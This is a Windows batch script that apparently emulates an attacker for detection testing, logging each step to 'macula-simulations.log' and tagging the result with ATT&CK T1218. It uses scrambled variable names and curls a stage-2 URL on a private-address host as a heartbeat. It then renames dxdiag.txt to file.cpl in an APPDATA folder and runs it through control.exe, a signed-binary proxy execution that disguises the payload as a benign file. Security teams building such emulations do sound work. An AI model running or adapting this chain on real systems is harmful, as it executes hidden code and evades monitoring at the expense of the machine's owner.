@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET douyiw=%APPDATA%\9697\439ebd0e
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?9697-7
SET eykalkg=BALAM-S2B
SET fkesh=7
SET ecrfwq=dxdiag.txt
SET rgnpbq=9697
SET bmkupr=%APPDATA%\!fkesh!\macula-simulations.log
SET jkdqfs=%APPDATA%\!fkesh!

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_start=>> "!bmkupr!" 2>nul
curl -k -s -o nul "!frytcn!"
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: heartbeat_complete=>> "!bmkupr!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_start=!douyiw!>> "!bmkupr!" 2>nul
cd /d "!douyiw!" 2>nul
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: chdir_complete=>> "!bmkupr!" 2>nul

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: rename_start=!ecrfwq!>> "!bmkupr!" 2>nul
if exist "!ecrfwq!" (
    ren "!ecrfwq!" file.cpl 2>nul
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: rename_complete=file.cpl>> "!bmkupr!" 2>nul
) else (
    echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: rename_failed=missing_file>> "!bmkupr!" 2>nul
    goto :logfail
)

echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: process_start=Control.exe>> "!bmkupr!" 2>nul
SET wpqazx=0
control.exe file.cpl 2>nul
if !errorlevel! equ 0 (
    SET wpqazx=1
    SET czpqws=
) else (
    SET czpqws=execution_failed
)
echo [!DATE! !TIME!][DEBUG][!eykalkg!][!rgnpbq!]: process_complete=!errorlevel!>> "!bmkupr!" 2>nul

:logfail
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do SET oqwyhk=%%I
SET oqwyhk=!oqwyhk:~0,4!-!oqwyhk:~4,2!-!oqwyhk:~6,2! !oqwyhk:~8,2!:!oqwyhk:~10,2!:!oqwyhk:~12,2!.!oqwyhk:~15,3!
echo [!oqwyhk!][TTP][!eykalkg!][!rgnpbq!]: T1218|Signed Binary Proxy Execution=!wpqazx!::!czpqws!>> "!bmkupr!" 2>nul